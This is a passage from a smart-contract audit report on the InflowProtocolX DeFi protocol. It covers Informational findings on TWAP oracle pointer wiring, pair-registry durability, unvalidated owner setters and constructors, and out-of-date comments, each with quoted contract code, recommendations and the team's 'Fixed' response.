The deploy-time call in `script/Deploy.s.sol` precedes any pin and cannot hit this. The only documented later call, the stable-migration batch, hits it only with a pin more than 3 hours old under the 1-hour window, which means the keeper has missed the playbook's instruction to pin every pair at least every `windowSeconds`; the two new stable pairs depend on the keeper alone until then, as the live cycle refreshes only the old VaultController's own pairs (`VaultController.sol:638-653`). The playbook's execution-day check, `hasCompletedWindow()` true on each pair, passes until a pin is 4 hours old, so it does not exclude a pin aged between 3 and 4 hours. Since `update()` is permissionless, a pin of each due pair just before the batch avoids the gap without code changes.

**(b) `removePair()` is not durable for pairs the ExpansionModule evaluates.** `removePair()` deletes the snapshot and records no removal (`TWAPOracle.sol:296-308`), while `registerPairFromExpansion()`, which the ExpansionModule calls when activating a rail, pricing a route hop or checking an existing IPX/rail pair (`ExpansionModule.sol:821`, `:1206`, `:1415`), seeds a fresh snapshot for any uninitialized pair (`TWAPOracle.sol:276-283`). The next evaluation thus re-registers a removed pair, resetting rather than retiring it, and a later owner `addPair()` reverts, harmlessly, with `PairAlreadyTracked`. The only removal `docs/MIGRATION_PLAYBOOK.md` calls for, of the retired stable pairs after a stable migration, is unaffected: a successor ExpansionModule built on the new stable no longer evaluates them.

## Location of Affected Code

Sub-section 1: the comment's promise, and a gate reading only the VaultController's oracle:

File: [src/IPXToken.sol#L307-L324](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L307-L324)

```solidity
// TWAP gate: trading MUST NOT open until the vault has an oracle
// and every base pair's TWAP has completed its first window on
// it. This prevents the operator from opening trading before the
// TWAP-backed protections (the IPX leg of D, the manipulation
// guard, the LP deviation gate, locked-POL valuation, rail
// preflight) are actually active. The oracle is required, not
// optional: without one the vault prices D from live reserves,
// which any caller can set with a trade.
IVaultController vc = IVaultController(vaultController);
address oracle = vc.twapOracle();
// code
if (!ITWAPOracle(oracle).hasCompletedWindow(is_)) revert BaseTwapNotReady(is_);
```

Sub-section 2(a): the continuity the NatSpec promises, and the rebaseline that restarts the windows while each kept pin keeps ageing:

File: [src/TWAPOracle.sol#L199-L226](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TWAPOracle.sol#L199-L226)

```solidity
///         so their windows begin together; any average already
///         pinned (and its `lastUpdateAt`) is kept, so consumers keep
///         reading the last completed window until the first joint
///         pin replaces it. Calling again replaces the set.
/// @dev    Owner-only because it restarts three windows: a completed
///         window is at least `windowSeconds` away afterwards.
    // code
    uint32 ts = _rebaseline(_ipxWplsPair);
    _rebaseline(_wplsStablePair);
    _rebaseline(_ipxStablePair);
    // code
    baseSetTimestampLast = ts;
```

## Impact

With the LiquidityDeployer's pointer unset, trading still opens, and until one owner call sets it, the IPX/WPLS base LP add can fill at an attacker-pushed ratio and the IPX/stable add at up to about 10% skew: an impermanent-loss-type loss, limited to the base LP deployed meanwhile, that costs the attacker the pool move plus swap fees and the trading tax. An unset ExpansionModule pointer only stops rail seeding. A `setBasePairs()` call made while a kept pin is within one window of its staleness limit skips the cycle (conversion, deployment, POL valuation, rail seeding) from the moment that pin expires until the first joint pin, at most one window. A removed pair the ExpansionModule evaluates is reset rather than retired, which can surprise an operator expecting it to stick, but serves no stale value: the re-seeded snapshot has `lastUpdateAt == 0`, so `consult()` reverts with `NoTWAPYet` until a new pin.

It is Informational because every path needs a trusted-owner action, most also an operator mistake or an unusual state (a pin more than 2 hours overdue during the migration batch), and each sub-section 2 path fails closed, serving no stale or manipulated price and risking no funds. Sub-section 1 needs a deviation from the deploy script, which wires all five oracle pointers (`script/Deploy.s.sol:298-302`), and its wider guarantee lives only in the inline comment: the README and launch playbook describe `openTrading()` only as waiting for every base pair's first TWAP window (`README.md:127-129`, `docs/LAUNCH_PLAYBOOK.md:11-13`), exactly what the code enforces.

## Recommendation

1. In `openTrading()`, also require `twapOracle()` on `vc.liquidityDeployer()` and `vc.expansionModule()` to equal `oracle`; both are public variables, but `ILiquidityDeployer` and `IExpansionModule` lack the getter. The VaultController is built to run without an ExpansionModule (`VaultController.sol:455`), so compare the module's pointer only when one is set, or reject a missing module with an explicit error if launching without one is not intended; a bare call on the zero address would revert `openTrading()` without a reason. Since every `setTWAPOracle()` stays owner-callable after launch, the check holds only at launch and the pointers can diverge later; the single oracle pointer, read from the VaultController, that I-15 recommends would remove that divergence and make the check unnecessary. Without the check, correct the comment to name only the protections the gate covers.

2. For the `TWAPOracle` pair registry:

   (a) In `setBasePairs()`, first pin every incoming pair that `canUpdate()` reports as due (for a current member, the whole current set): each kept average then starts fresh and, as `maxTwapStaleness` is at least twice `windowSeconds`, outlasts the restarted window. Until then, the operator should call `oracle.update()` on each due pair in a separate transaction just before the migration batch, not inside it: `update()` reverts with `PeriodNotElapsed` on a pair no longer due (say, one a cycle or the keeper pinned in between), which inside the batch would also undo `executeVaultControllerMigration()`. Either way, qualify the continuity statement in the `setBasePairs()` NatSpec and in step 7.2 of `docs/MIGRATION_PLAYBOOK.md`: it holds only while each kept pin is younger than `maxTwapStaleness - windowSeconds`.

   (b) Record removed pairs in a `retired[pair]` flag that `registerPairFromExpansion()` checks and `addPair()` clears, or document that `removePair()` does not stick for pairs the ExpansionModule evaluates. A retired pair stays unpriced while flagged, since every ExpansionModule call site wraps the registration in `try` and skips the pair and the VaultController values that rail's POL at zero (`VaultController.sol:1386`); retire only pairs nothing reads any more, such as the old stable pairs after a stable migration, and re-add one with `addPair()` if needed.

## Team Response

Fixed.

# [I-15] `setTWAPOracle()` Accepts Zero After Launch and Unusable Addresses, Contrary to Parts of the Documentation, and Four Comments Misstate When the Spot-Guard Reference Moves

## Severity

Informational Risk

## Description

The five `setTWAPOracle()` setters (`VaultController.sol:245-249`, `ConversionModule.sol:184-188`, `LiquidityDeployer.sol:143-147`, `ExpansionModule.sol:257-261`, `ArbitrageMonitor.sol:203-207`) set independent pointers and reject only an unchanged value, so they accept zero after launch, which part of the documentation treats as impossible, and any unusable address, which reverts the cycle in modules documented to decline gracefully. Separately, the VaultController writes its spot-guard reference on expansion spending, which four comments say never happens.

### 1. `setTWAPOracle()` accepts zero after launch or any unusable address

**(a) The documentation disagrees on whether the oracle may be unset after launch, and the setters enforce neither reading.** Part of the documentation treats the oracle as mandatory once trading is open. The `openTrading()` comment says "The oracle is required, not optional: without one the vault prices D from live reserves, which any caller can set with a trade." (`IPXToken.sol:305-312`). The ConversionModule and LiquidityDeployer setters call a zero pointer bootstrap-only, the latter adding that it "should not run this way in production" (`ConversionModule.sol:180-183`, `LiquidityDeployer.sol:139-142`), and the VaultController's own comments describe its spot path as bootstrap-only (`VaultController.sol:1058`, `:1215`, `:1491`). The README's ConversionModule entry ("fails closed without a TWAP", `README.md:52`) and the `_ipxForStable()` NatSpec ("the swap itself fails closed then", `ConversionModule.sol:453-454`) both promise that conversion fails closed without a TWAP. That holds while any oracle is configured, even one without a completed window, because the leg then declines; with a zero pointer, `_ipxForStable()` returns an unbounded shortfall and `_legQuote()` sets `minOut` from the router quote alone (`ConversionModule.sol:458`, `:540-541`).

The rest of the documentation allows a zero pointer after launch. The VaultController setter NatSpec says zero "explicitly selects the spot-comparison fallback (useful during phased rollout or if the oracle needs replacing before pairs are re-initialised)" and keeps the setter outside `lockModules()` (`VaultController.sol:237-244`), the ArbitrageMonitor's says zero "explicitly selects the spot-only classification" (`ArbitrageMonitor.sol:194-196`), and the spot branch of `_ipxWplsQForD()` "never prices a live cycle unless the owner later unwires the oracle" (`VaultController.sol:1217-1219`). No setter enforces either reading, and `openTrading()` checks only the VaultController's pointer, once. The brief's owner list also omits these setters, a documentation item covered in I-17.

A zero pointer puts each consumer on spot. D's IPX leg becomes IPX/WPLS spot (`VaultController.sol:1216-1220`), `_inBullishMomentum()` compares that spot with itself and never blocks (`VaultController.sol:1493-1497`), the anchor guard falls back to `_spotGuardTripped()`, a 20% band around the stored reference `lastWplsStablePriceQ` (sub-section 2), the ConversionModule takes `minOut` from the router quote, the LiquidityDeployer's `_twapGuard()` returns `None`, and the ArbitrageMonitor returns the unconfirmed spot zone. B instead reads $0, because `_tokenAmountUsd()` has no TWAP to price IPX or WPLS, so no new rail stage activates. Conversion minimums and LP-add ratios then follow a price that the transaction triggering the cycle can move, the exposure the `openTrading()` comment warns of. Reaching that state after launch takes an owner action, which the VaultController and ArbitrageMonitor NatSpec present as a supported fallback, so the defect is the contradictory documentation and the unenforced intent, not the fallback itself.

**(b) An unusable oracle reverts the cycle in modules whose NatSpec describes a graceful decline.** No setter checks code, interface conformance, window readiness, `oracle.vaultController()` or agreement with `VaultController.twapOracle()`, so a consumer can point at an EOA or non-conforming contract. The LiquidityDeployer's `_twapConsult()`, a "graceful zero-return on any unavailability", calls `hasCompletedWindow()` outside its `try` (`LiquidityDeployer.sol:715-728`); as the VaultController calls `deploy()` without `try`, every deployment with a base leg reverts in `_twapGuard()` and rolls back conversion and expansion, though `_twapGuard()`'s NatSpec says a guarded pool "never rolls back the conversion". In the ArbitrageMonitor ("When the TWAP is unavailable the zone is NEUTRAL"), the `try` around `liveTwapQ()` in `_liveMeans()` catches a reverting contract, as documented, but not the failed decode of a codeless oracle's empty return data, so `getZone()`, which the VaultController calls without `try`, reverts the cycle; that code runs only on a ≥3% spot IPX gap, which an attacker can push before each cycle. In the ExpansionModule, `_twapOut()` ("zero on any unavailability"), `_twapHopOut()` and `_twapPriceOkForExistingPair()` call `hasCompletedWindow()` directly (`ExpansionModule.sol:1348`, `1207`, `1422`), and the `try` around `registerPairFromExpansion()` catches a reverting contract but not a codeless target, whose code-existence check fails in the caller; with `checkExpansion()` and `contributeToRail()` called without `try` by the VaultController and the LiquidityDeployer respectively, every cycle that prices a rail route reverts.

This needs an oracle the owner has misconfigured. `IPXToken` catches the cycle revert and emits `CycleFailed` (`IPXToken.sol:436-440`), so user transfers go through and only the cycle stops; the VaultController's own hard reads fit its TWAP-or-nothing design; and the ConversionModule reads the oracle through fail-soft `staticcall`s (`ConversionModule.sol:599-602`).

### 2. Four comments misstate when the spot-guard reference moves

`lastWplsStablePriceQ` is the reference the VaultController's spot guard compares the WPLS/stable price with while its oracle is unset (`VaultController.sol:1060-1070`). Four comments say that only a cycle that sold moves it: the STEP 3 comment in `_runCycle()` says the reference is never "written by a cycle that sold nothing" (`VaultController.sol:421-425`), the comment after the expansion step says it "now moves only on a sale" (`VaultController.sol:486`), the cycle-end comment says it "moves only here, on a cycle that sold" (`VaultController.sol:592-593`), and `_calculateD()` repeats that "its reference moves only on a sale" (`VaultController.sol:1059`).

The code writes it in three places: the owner's `recordPriceSnapshots()` (`VaultController.sol:1507-1509`), the end of a cycle that converted IPX (`VaultController.sol:590-598`), and the expansion step whenever `checkExpansion()` reports `spent > 0` (`VaultController.sol:457-467`), which happens whether or not the cycle later sells anything. The expansion write is deliberate, as its own comment explains, so it is the four comments that are out of date. Because only the unwired guard reads the reference, the mismatch changes nothing while the VaultController's oracle is wired; in the unwired mode, the reference absorbs the price move of the protocol's own stable-to-WPLS buys on the anchor during expansion, not only that of its sales.

## Location of Affected Code

Sub-section 1(a): the NatSpec offers zero as a post-launch fallback, and the setter accepts zero, or any address, at any time:

File: [src/VaultController.sol#L237-L249](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L237-L249)

```solidity
/// @notice Set the TWAP oracle used by the manipulation
///         guard. Passing address(0) explicitly selects the
///         spot-comparison fallback (useful during phased rollout
///         or if the oracle needs replacing before pairs are
///         re-initialised). NOT gated by `lockModules` - the oracle
///         is a defensive read-only signal, not a fund-controlling
///         module, and the owner needs freedom to point at a fresh
///         oracle if this one's snapshot state is compromised.
function setTWAPOracle(address _oracle) external onlyOwner {
    if (_oracle == twapOracle) revert NoChange();
    twapOracle = _oracle;
    emit TWAPOracleSet(_oracle);
}
```

Sub-section 1(a): the LiquidityDeployer's identical setter documents zero as bootstrap-only, yet accepts it at any time:

File: [src/LiquidityDeployer.sol#L139-L147](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L139-L147)

```solidity
/// @notice Set/replace the TWAP oracle. Not lock-gated -
///         defensive read-only signal. Passing address(0) disables
///         the pre-add deviation gate (bootstrap only - should not
///         run this way in production).
function setTWAPOracle(address _oracle) external onlyOwner {
    if (_oracle == twapOracle) revert NoChange();
    twapOracle = _oracle;
    emit TWAPOracleSet(_oracle);
}
```

Sub-section 1(b): the "graceful zero-return" calls `hasCompletedWindow()` outside its `try`, so an unusable oracle reverts instead of returning zero:

File: [src/LiquidityDeployer.sol#L715-L728](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L715-L728)

```solidity
/// @dev TWAP query with graceful zero-return on any
///      unavailability. Callers treat 0 as "TWAP not available".
function _twapConsult(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
    if (twapOracle == address(0) || pair == address(0) || amountIn == 0) return 0;
    // Treat "no completed window yet" as unavailable. A configured
    // oracle makes the caller decline the leg; an unset oracle is the
    // only bootstrap bypass.
    if (!ITWAPOracle(twapOracle).hasCompletedWindow(pair)) return 0;
    try ITWAPOracle(twapOracle).consult(pair, tokenIn, amountIn) returns (uint256 out) {
        return out;
    } catch {
        return 0;
    }
}
```

Sub-section 2: the expansion step writes the reference whenever expansion spends, whether or not the cycle sells:

File: [src/VaultController.sol#L457-L467](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L457-L467)

```solidity
if (spent > 0) {
    polChanged = true;
    // The stable that left came out of the protected seed;
    // every withdrawing path in the expansion module reports
    // it as spent, whether the rail opened or the swap was
    // lost after the withdrawal.
    _debitProtectedSeed(spent);
    // The guard cleared the pre-swap price; the post-swap price
    // is the legitimate reference for the next cycle.
    lastWplsStablePriceQ = _wplsStablePriceQ();
}
```

Sub-section 2: the cycle-end comment says the reference moves only here:

File: [src/VaultController.sol#L590-L599](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L590-L599)

```solidity
if (ipxConverted > 0) {
    if (!partialRound) lastExecutionTime = block.timestamp;
    // The anchor reference for the unwired spot guard moves only
    // here, on a cycle that sold. Recording it on every cycle let
    // a free cycle (a few wei of IPX into a pair) walk it by up to
    // the guard's band each step, so the guard compared spot with
    // whatever the last caller left. Read at cycle end so the
    // reference is the price the round actually traded at.
    lastWplsStablePriceQ = _wplsStablePriceQ();
}
```

## Impact

Sub-section 1(a) misleads operators and integrators rather than exposing funds. A reader of the `openTrading()` comment, the README or the ConversionModule and LiquidityDeployer NatSpec expects conversion and LP adds to fail closed without a TWAP for the protocol's whole life, while the owner can, as the VaultController and ArbitrageMonitor NatSpec allow, unwind any consumer after launch and put D, momentum, conversion minimums and LP-add ratios on a spot price that the transaction triggering the cycle can move. Sub-section 1(b) needs the owner to set an unusable oracle; it stops conversion, deployment or rail work until the pointer is corrected, user transfers keep working, and nothing is lost. Sub-section 2 is a comment mismatch on a reference that only the unwired guard reads, so it changes nothing while the VaultController's oracle is wired.

The issue is Informational: every effect needs the trusted owner to set a zero pointer after launch, which part of the code documents as a supported fallback, or an unusable one, and no path loses funds. What remains is contradictory documentation, setters that do not validate their input, and out-of-date comments.

## Recommendation

1. For the oracle setters:

   (a) Decide whether a zero pointer is a supported mode after launch, and make the code and the documentation agree. If it is not, reject `address(0)` in every setter once `IIPXToken.tradingOpen()` is true, and drop the VaultController NatSpec advice to pass zero when replacing the oracle; rotation already works as a single-step replacement. The cost, in the safe direction, is that the VaultController skips every cycle until a replacement's anchor window completes; preparation before the switch avoids it: register the base set (`addPair()`, `setBasePairs()`) and the pairs `ExpansionModule.railTwapPairs()` lists, call `setVaultController()`, match the live window and let one window complete (anyone can, as `update()` is permissionless). Unprepared, a replacement also values locked rail POL at $0 in B (`VaultController.sol:1311-1316`) until the rail pairs are registered and matured. No setter check reaches a never-assigned pointer: a consumer left at zero before launch stays there, as `openTrading()` checks only the VaultController's pointer (see I-14); the single pointer at the end of Recommendation 1 closes that path. If zero is to remain a post-launch fallback, document it as one instead: correct the `openTrading()` comment, `README.md:52`, the `_ipxForStable()` NatSpec, the ConversionModule and LiquidityDeployer setter NatSpec and the VaultController's bootstrap-only comments, and state that conversion minimums and LP-add ratios then follow spot.

   (b) In each setter, require `_oracle.code.length > 0` and a conformance probe such as `windowSeconds() > 0`, but not a completed window: `script/Deploy.s.sol:297-302` deploys the oracle and wires every consumer before any pair is registered (`script/Deploy.s.sol:304-310`), and `hasCompletedWindow()` is false for an untracked pair (`TWAPOracle.sol:412-415`), so launch would revert; on the playbook's new-stable path, step 1.8 wires the successor before step 3.2 registers its new stable pairs, which mature only during the 30-day timelock. A probe through `hasCompletedWindow()` must check only for a well-formed `bool`, whatever its value. To enforce readiness on-chain, require completed windows on the three base pairs, as `openTrading()` does, only while trading is open and the VaultController is the token's live controller (`IIPXToken(ipxToken).vaultController() == address(this)`); both are needed, as `script/Deploy.s.sol:203` makes the vault live controller before wiring the oracle. Launch and successor wiring stay untouched, and an emergency replacement waits about one window, in which the cycle could not run on it anyway.

   Also under (b), make the LiquidityDeployer, ArbitrageMonitor and ExpansionModule oracle reads, including the ArbitrageMonitor's `windowSeconds()` reads (`ArbitrageMonitor.sol:474`, `ArbitrageMonitor.sol:492`; see I-18), fail-soft via a low-level `staticcall` with a return-length check, as the ConversionModule does (`ConversionModule.sol:599-607`); a bare `try` misses codeless targets and undecodable return data, which is how `getZone()` and the ExpansionModule fail today. A failed read must take the caller's existing branch for a configured oracle with no usable TWAP (`LpDecline.TwapUnavailable` in `_twapGuard()`, zero in `_twapOut()` and `_twapHopOut()`, `false` in `_twapPriceOkForExistingPair()`, NEUTRAL in `_twapZone()`), never the `twapOracle == address(0)` branch, which would make a broken oracle fall back to spot. Keep the state-writing `registerPairFromExpansion()` a normal call inside `try`, leaving codeless targets to the setter's code check: under a `staticcall` every new rail pair registration would fail, and `_twapPriceOkForExistingPair()` would decline that rail on every pass.

   For both (a) and (b), prefer one oracle pointer read from the VaultController, so consumers cannot diverge and the checks live in one setter. The ArbitrageMonitor, unbound to a VaultController by design for reuse across migrations (`docs/MIGRATION_PLAYBOOK.md:34-50`), would resolve it via `IIPXToken(ipxToken).vaultController()` and so follow a migration on its own. Each read costs an external call into the VaultController, so read the pointer once per entry point. Wiring in `script/Deploy.s.sol:298-302` and playbook step 1.8 reduces to the VaultController call, and the timelock proposed in I-17 needs one queue instead of five.

2. Either remove the write at `VaultController.sol:466`, so the reference moves only on a sale as the comments say, or correct the four comments to name the expansion write. Removal makes the protocol's own stable-to-WPLS buys on the anchor during expansion count against the next cycle's band (small next to the 20% band), whereas correcting the comments keeps today's behaviour.

## Team Response

Fixed.

# [I-16] Privileged Functions and Constructors Skip Input or State Guards, so a Wrong Value or a Repeated Call Goes Through Instead of Reverting

## Severity

Informational Risk

## Description

Several owner- or multisig-only functions and constructors skip input or state checks, often ones a sibling function already makes, so a single owner, deployer or multisig mistake goes through instead of reverting.

### 1. Slippage setters accept 0, which halts conversion or deployment

`ExpansionModule.setSlippage()` and `LiquidityDeployer.setSlippage()` cap only the top, at 1500 and 2000 bps (`ExpansionModule.sol:299-305`, `LiquidityDeployer.sol:132-137`), and accept 0, where rounding makes the tolerance practically impossible to meet, so choosing 0 as the strictest value halts instead: rail adds revert whole cycles, or base LP legs decline. The ConversionModule's own `setSlippage()` enforces `MIN_SLIPPAGE_BPS = 100`, and its `setConversionCap()` rejects 0 because "Zero would disable conversion".

**a. ExpansionModule.** On a live pair, `contributeToRail()` sizes the IPX leg as `ipxAmount = floor(t·I/R)` (`_ipxToMatchRail()`), so unless `t·I` is an exact multiple of `R`, the router's `amountBOptimal = floor(ipxAmount·R/I)` falls below `tokenAmount`, which zero slippage makes `minToken`, and `addLiquidity()` reverts with `INSUFFICIENT_B_AMOUNT` after the stable-to-rail swap. With no `try` in `LiquidityDeployer._contributeToRail()` or the VaultController's `deploy()` call, the whole cycle rolls back, conversion included (a sell-triggered cycle ends in `CycleFailed`). First seeds into empty (0,0) pairs avoid the revert, as `_addRailLiquidity()` zeroes their minimums, but `_minRailOut(expected) == expected` makes the preflight `_clearsFloor()` reject any route whose spot fill is below its TWAP output, skipping the rail with `RouteBelowFloorSkipped` if none clears.

**b. LiquidityDeployer.** `_canMintLiquidity()` re-derives `pairedOptimal` from an IPX leg floored from the paired amount, so unless the division is exact it lands below `minPaired`, now `pairedAmount` (`LiquidityDeployer.sol:768-775`), and practically every unclamped base leg declines with `CannotMint`, traced only by an `LpLegDeclined` event per leg.

No document promises a lower bound for these two settings: `AUDIT_BRIEF.md` and the README call them only "bounded" (`AUDIT_BRIEF.md:58-59`, `README.md:306-307`), which the caps satisfy.

`ConversionModule.setMaxLegDeviation()` also accepts 0 (`ConversionModule.sol:160-166`), but there, zero is a documented setting rather than a missing guard: the migration playbook gives the range as 0..2,000, notes that "zero requires equal executable quotes" (`docs/MIGRATION_PLAYBOOK.md:184-186`), and states that an all-skipped round does not enable deployment (`docs/MIGRATION_PLAYBOOK.md:202-203`). What it leaves implicit is how rarely that condition holds: spot and fee-adjusted TWAP outputs practically never match the wei and `_deviationBps()` rounds up (`ConversionModule.sol:574-580`), so at 0 practically every leg declines at `ConversionModule.sol:558` and conversion and deployment stop, the outcome `setConversionCap()` refuses for its own zero. As a documentation inconsistency, `AUDIT_BRIEF.md` also omits `setMaxLegDeviation()` from the owner-control list it calls exhaustive (`AUDIT_BRIEF.md:66`).

### 2. `IPXToken` owner functions skip state and input guards that their sibling functions apply

**a. `openTrading()` has no one-shot guard.** After its VaultController, oracle and three base-pair-window checks, `openTrading()` clears the deployer and initial-holder exemptions, sets `tradingOpen = true` and emits `TradingOpened`, without first checking `tradingOpen`, the flag `setVaultController()` uses to lock itself after launch (`IPXToken.sol:134-135`). The flag stays one-way (a repeat only rewrites `true`; `setVaultController()` stays locked), but a repeat clears any exemption the owner has since deliberately re-granted to either wallet and emits a second `TradingOpened`, or reverts if a base-pair window has gone stale. The out-of-scope `script/OpenTrading.s.sol` calls `ipx.openTrading()` without reading `tradingOpen()`, so re-running it from the owner key is the same owner action; it gets through once the base set is due for its next pin, since its first step, `oracle.update()`, reverts with `PeriodNotElapsed` unless a full window has passed since the last base pin or the set was pinned in the same block (`TWAPOracle.sol:327-332`, `:356-357`).

**b. `rescueToken()` treats a call to a codeless address as success.** `IPXToken.rescueToken()` makes a low-level `call` to `transfer(to, amount)` and accepts `ok && data.length == 0`, which any call to a codeless account satisfies, so a rescue aimed at a mistyped, codeless token address moves nothing without reverting. The VaultController gets this right twice: `_tryTransferStable()` requires code when the token returns no data (`VaultController.sol:972-973`), and `VaultController.rescueToken()` uses SafeERC20, which does the same, and rejects the `to == address(0)` that `IPXToken.rescueToken()` accepts (`VaultController.sol:373-374`, `safeTransfer()` at `:381`).

**c. `setPair()` and `setFeeExempt()` accept the zero address.** `setPair()` checks only that the flag changes (`IPXToken.sol:266-270`), so unlike the ExpansionModule's `registerPair()` path (`IPXToken.sol:282`) it accepts `address(0)`, and it never checks that the address is a pair holding IPX. `setFeeExempt(address(0), true)` is accepted too (`IPXToken.sol:248-252`), though the internal `_setExemption()` skips zero (`IPXToken.sol:231-235`). Both flags are inert for the zero address, as `_update()` returns early for mints and burns before reading `isPair` or `isFeeExempt` (`IPXToken.sol:384-387`).

### 3. `TreasuryController` accepts an unbounded timelock and its own address as the treasury wallet, which can permanently freeze wallet rotation or funds

The constructor only requires `_treasuryWalletTimelock` to be at least `MIN_TREASURY_WALLET_TIMELOCK` (24 hours) before storing it as an immutable (`TreasuryController.sol:68-78`), and `queueTreasuryWalletChange()` adds it to `block.timestamp`: a delay of centuries puts every queued change out of reach, and a near-maximum value overflows the sum so every queue attempt reverts, freezing rotation for the controller's lifetime; restoring it needs a successor controller and `LiquidityDeployer` (which holds the controller as an immutable) through the migration path. Nothing is lost by this alone, as the current wallet keeps receiving the slice, and the mistake needs a deployer who changes the 48-hour source constant hard-coded in `script/Deploy.s.sol` or deploys outside the script.

The constructor and `queueTreasuryWalletChange()` also reject only zero, so the wallet can be the controller itself: on the queue path through one wrong owner-multisig address, on the constructor path only if the deployer precomputes the controller's deployment address, a deliberate act rather than a typo. Once the treasury stage is active, `LiquidityDeployer.deploy()` pays the slice in stable to whatever `treasuryWallet()` returns (`LiquidityDeployer.sol:287-293`), `VaultController.withdrawTo()` checks only for a non-zero recipient, and the controller (NatSpec: "the contract itself never custodies funds") has no token transfer or rescue function, so the slice cannot be moved again. Any other address that cannot move stable, such as a token contract, strands it the same way; the controller's own address is just the one case the contract can reject by itself.

### 4. Constructors do not enforce the token assumptions the accounting relies on

**a. No on-chain check that the stable has 6 decimals and no transfer fee.** The VaultController, ConversionModule, LiquidityDeployer and ExpansionModule constructors only check `_stable` against zero (`VaultController.sol:222-229`, `ConversionModule.sol:139-146`, `LiquidityDeployer.sol:105-114`, `ExpansionModule.sol:221-230`), and migration deliberately does not compare the successor's `stable()` (NatSpec on `executeVaultControllerMigration()`: "stable is deliberately NOT required to match - migrating to a new stable is a valid reason to migrate", `IPXToken.sol:166-169`). Yet `InflowConstants` states "All USD figures use 6 decimals (USDC native)." (`InflowConstants.sol:6`), `_tokenAmountUsd()` values the stable at its raw amount (`VaultController.sol:1370-1372`), and `docs/MIGRATION_PLAYBOOK.md:88` says a new stable "MUST report `decimals() == 6`" and "MUST NOT take a fee on transfer"; the code checks neither. The initial deployment is exposed too, as `script/Deploy.s.sol:94` (out of scope; context only) reads the stable from the `USDC` environment override via `vm.envOr()` without a decimals check.

**b. Constructors accept non-distinct `ipxToken`, `wpls` and `stable`.** Those four and `ArbitrageMonitor` (`ArbitrageMonitor.sol:162-167`) store the three tokens as immutables after a zero check only. With `_wpls == _stable`, an ArbitrageMonitor's `_prices()` calls `_ordered(wplsStablePair, wpls, stable)` (`ArbitrageMonitor.sol:327`), which no real pair's two distinct tokens can match, so once its pairs are set every `getZone()` reverts with `TokenMismatch`; the VaultController calls `getZone()` without `try` (`VaultController.sol:507-509`), so every cycle reaching the zone read reverts and the token only records `CycleFailed`, though user transfers continue, as the token catches the revert. In such a ConversionModule, `_pairForOutput()` tests `wpls` first (`ConversionModule.sol:632-636`), so its stable legs, swapping along `[ipxToken, tokenOut]` (`ConversionModule.sol:501-503`), trade on IPX/WPLS.

## Location of Affected Code

Sub-section 1, only a cap, as in `LiquidityDeployer.setSlippage()` (`src/LiquidityDeployer.sol:132-137`), whereas `ConversionModule.setSlippage()` also rejects values below `MIN_SLIPPAGE_BPS` (`src/ConversionModule.sol:153-158`):

File: [src/ExpansionModule.sol#L299-L305](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L299-L305)

```solidity
function setSlippage(uint256 _bps) external onlyOwner {
    if (_bps > 1500) revert SlippageTooHigh(_bps, 1500);
    if (_bps == lpSlippageBps) revert NoChange();
    uint256 oldBps = lpSlippageBps;
    lpSlippageBps = _bps;
    emit SlippageUpdated(oldBps, _bps);
}
```

Sub-section 2b, no code-length or zero-recipient check (for 2a, `openTrading()` at `src/IPXToken.sol:304-350` never checks `tradingOpen` at entry):

File: [src/IPXToken.sol#L449-L455](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L449-L455)

```solidity
function rescueToken(address token, address to, uint256 amount) external onlyOwner {
    // code
    (bool ok, bytes memory data) = token.call(
        abi.encodeWithSelector(0xa9059cbb, to, amount) // transfer(address,uint256)
    );
    if (!(ok && (data.length == 0 || abi.decode(data, (bool))))) revert RescueTransferFailed();
}
```

Sub-section 3, a zero check and an unbounded delay:

File: [src/TreasuryController.sol#L91-L96](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TreasuryController.sol#L91-L96)

```solidity
function queueTreasuryWalletChange(address _wallet) external onlyOwner {
    if (_wallet == address(0)) revert ZeroAddress();
    pendingTreasuryWallet = _wallet;
    pendingTreasuryWalletEta = block.timestamp + treasuryWalletTimelock;
    // code
}
```

Sub-section 4, zero checks only, as in the other constructors (for 4b, `src/ArbitrageMonitor.sol:507-514`, where `_ordered()` cannot match any pair when `a == b`):

File: [src/VaultController.sol#L222-L224](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L222-L224)

```solidity
if (_ipxToken == address(0)) revert ZeroAddress();
if (_wpls == address(0)) revert ZeroAddress();
if (_stable == address(0)) revert ZeroAddress();
```

## Impact

A zero slippage setting (sub-section 1) disrupts only while it stands, halting conversion and deployment intermittently (ExpansionModule, in cycles that buy for an active rail) or stopping base POL growth (LiquidityDeployer). No funds are lost and the owner can restore a non-zero value at once, so what remains is validation hygiene: a lower bound the ConversionModule already enforces for its own slippage and conversion cap. A zero leg deviation stops conversion and deployment in the same reversible way, but it is a documented setting, not a missing guard.

`IPXToken` (sub-section 2) holds no protocol assets, since tax goes to the VaultController, and every case can be undone: `setFeeExempt()` restores cleared exemptions, a silently failed (and possibly unnoticed) rescue leaves the tokens in place to be rescued again with the right address, and a wrong flag on any non-zero address is undone with a second call, so nothing is lost or locked and no core function is disrupted.

